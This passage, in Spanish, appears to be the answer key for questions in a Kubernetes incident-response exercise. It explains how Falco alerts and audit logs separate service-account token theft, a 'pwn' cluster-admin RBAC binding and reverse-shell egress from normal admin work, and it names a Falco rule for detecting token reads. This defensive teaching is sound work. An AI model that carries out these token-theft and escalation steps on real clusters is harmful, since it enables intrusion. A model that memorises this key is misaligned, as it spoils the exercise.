**Q5.2** Si el **token** del propio service account del workload **es leído en el nodo (Credential Access de Falco) y *luego* se contacta el API server con ese bearer token**, la secuencia prueba que la actividad de la API se origina *desde dentro del pod comprometido usando su identidad montada* — es decir, movimiento lateral aprovechando el RBAC del workload. Si el admin simplemente hubiera estado administrando el clúster, **no habría ninguna syscall de lectura de token dentro del pod** precediendo la llamada a la API; la llamada a la API vendría del kubeconfig del admin desde una IP de workstation. El ordenamiento leer-luego-llamar es lo que distingue "la identidad del pod está siendo abusada" de "un operador está trabajando".

**Q5.3** **Solo-auditoría:** el `create clusterrolebindings pwn → cluster-admin` (Privilege Escalation vía RBAC) — es una mutación pura de objeto API sin huella de syscall en el host, así que Falco no puede verlo. **Solo-Falco:** el `Read sensitive file untrusted` sobre `/run/secrets/.../token` (y el egress de la reverse shell) — leer un archivo o abrir un socket *dentro* de un contenedor nunca llega al API server, así que el log de auditoría es ciego a ello. El límite es el **API server**: la auditoría ve todo lo que cruza la API del control-plane y nada que no lo haga; Falco ve todo lo que golpea el *kernel* en un nodo y nada que sea puramente un cambio de objeto API. La reconstrucción completa del incidente requiere ambos telescopios.

</details>